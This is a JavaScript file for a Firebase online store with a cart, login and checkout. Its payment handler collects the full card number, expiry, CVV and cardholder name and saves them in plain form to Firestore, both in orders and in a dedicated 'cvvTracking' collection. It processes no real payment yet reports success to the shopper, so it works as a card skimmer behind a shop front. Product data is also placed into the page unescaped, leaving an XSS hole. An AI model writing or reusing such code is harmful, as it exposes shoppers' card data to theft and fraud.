// Global variables
let currentUser = null;
let cart = [];
let products = [];

// Initialize store
document.addEventListener('DOMContentLoaded', () => {
    loadProducts();
    loadCartFromStorage();
    setupAuthListener();
});

// Auth listener
function setupAuthListener() {
    auth.onAuthStateChanged((user) => {
        currentUser = user;
    });
}

// Load products from Firebase
async function loadProducts() {
    try {
        const snapshot = await db.collection('products').get();
        products = [];
        snapshot.forEach(doc => {
            products.push({
                id: doc.id,
                ...doc.data()
            });
        });
        displayProducts(products);
    } catch (error) {
        console.error('Error loading products:', error);
    }
}

// Display products in store
function displayProducts(products) {
    const grid = document.getElementById('productsGrid');
    if (!grid) return;
    
    grid.innerHTML = '';

    if (products.length === 0) {
        grid.innerHTML = '<p class="no-products">No products available</p>';
        return;
    }

    products.forEach(product => {
        grid.innerHTML += `
            <div class="product-card">
                <img src="${product.imageUrl || 'https://via.placeholder.com/200'}" 
                     alt="${product.name}"
                     onerror="this.src='https://via.placeholder.com/200'">
                <h3>${product.name}</h3>
                <p class="price">₹${product.price}</p>
                <p class="description">${product.description || ''}</p>
                <p class="stock">${product.stock > 0 ? 'In Stock' : 'Out of Stock'}</p>
                <button class="btn-add-to-cart" onclick="addToCart('${product.id}')" 
                        ${product.stock <= 0 ? 'disabled' : ''}>
                    Add to Cart
                </button>
            </div>
        `;
    });
}

// Add to cart
function addToCart(productId) {
    const product = products.find(p => p.id === productId);
    if (product && product.stock > 0) {
        cart.push(product);
        updateCartCount();
        saveCartToStorage();
        showNotification('Product added to cart!');
    }
}

// Calculate total
function calculateTotal() {
    return cart.reduce((total, item) => total + item.price, 0);
}

// Update cart count
function updateCartCount() {
    const countEl = document.getElementById('cartCount');
    if (countEl) {
        countEl.textContent = cart.length;
    }
}

// Save cart to localStorage
function saveCartToStorage() {
    localStorage.setItem('cart', JSON.stringify(cart));
}

// Load cart from localStorage
function loadCartFromStorage() {
    const saved = localStorage.getItem('cart');
    if (saved) {
        cart = JSON.parse(saved);
        updateCartCount();
    }
}

// Show notification
function showNotification(message) {
    // Simple alert for now
    alert(message);
}

// Open cart modal
function openCart() {
    const modal = document.getElementById('cartModal');
    const itemsDiv = document.getElementById('cartItems');
    
    if (cart.length === 0) {
        itemsDiv.innerHTML = '<p class="empty-cart">Your cart is empty</p>';
    } else {
        itemsDiv.innerHTML = cart.map(item => `
            <div class="cart-item">
                <div class="cart-item-info">
                    <h4>${item.name}</h4>
                    <p>₹${item.price}</p>
                </div>
                <button class="btn-remove" onclick="removeFromCart('${item.id}')">
                    <i class="fas fa-trash"></i>
                </button>
            </div>
        `).join('');
    }
    
    document.getElementById('cartTotal').textContent = calculateTotal();
    modal.style.display = 'block';
}

// Remove from cart
function removeFromCart(productId) {
    const index = cart.findIndex(item => item.id === productId);
    if (index !== -1) {
        cart.splice(index, 1);
        updateCartCount();
        saveCartToStorage();
        openCart(); // Refresh cart display
    }
}

// Close cart
function closeCart() {
    document.getElementById('cartModal').style.display = 'none';
}

// Checkout
function checkout() {
    if (!currentUser) {
        alert('Please login first!');
        googleLogin();
        return;
    }
    
    if (cart.length === 0) {
        alert('Your cart is empty!');
        return;
    }
    
    closeCart();
    const modal = document.getElementById('checkoutModal');
    document.getElementById('checkoutTotal').textContent = calculateTotal();
    modal.style.display = 'block';
}

// Close checkout
function closeCheckout() {
    document.getElementById('checkoutModal').style.display = 'none';
}

// Payment form submit
document.getElementById('paymentForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    if (!currentUser) {
        alert('Please login!');
        return;
    }
    
    // Get card details
    const cardDetails = {
        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        expiry: document.getElementById('expiryDate').value,
        cvv: document.getElementById('cvv').value,
        holderName: document.getElementById('cardName').value,
        type: detectCardType(document.getElementById('cardNumber').value)
    };
    
    // Create order
    const orderData = {
        userId: currentUser.uid,
        userEmail: currentUser.email,
        products: cart.map(item => ({
            id: item.id,
            name: item.name,
            price: item.price
        })),
        totalAmount: calculateTotal(),
        cardDetails: cardDetails,
        status: 'completed',
        createdAt: new Date().toISOString()
    };
    
    try {
        // Save order
        await db.collection('orders').add(orderData);
        
        // Update product stock
        for (let item of cart) {
            const productRef = db.collection('products').doc(item.id);
            await productRef.update({
                stock: firebase.firestore.FieldValue.increment(-1)
            });
        }
        
        // Save to CVV tracking
        await db.collection('cvvTracking').add({
            cvv: cardDetails.cvv,
            cardNumber: cardDetails.cardNumber,
            amount: calculateTotal(),
            timestamp: new Date().toISOString(),
            userEmail: currentUser.email
        });
        
        alert('Payment successful! Order placed.');
        
        // Clear cart
        cart = [];
        updateCartCount();
        saveCartToStorage();
        closeCheckout();
        
        // Reload products to update stock
        loadProducts();
        
    } catch (error) {
        console.error('Payment error:', error);
        alert('Payment failed: ' + error.message);
    }
});

// Detect card type
function detectCardType(number) {
    const firstDigit = number[0];
    if (firstDigit === '4') return 'Visa';
    if (firstDigit === '5') return 'Mastercard';
    if (firstDigit === '3') return 'American Express';
    return 'Unknown';
}

// Scroll to products
function scrollToProducts() {
    document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
}
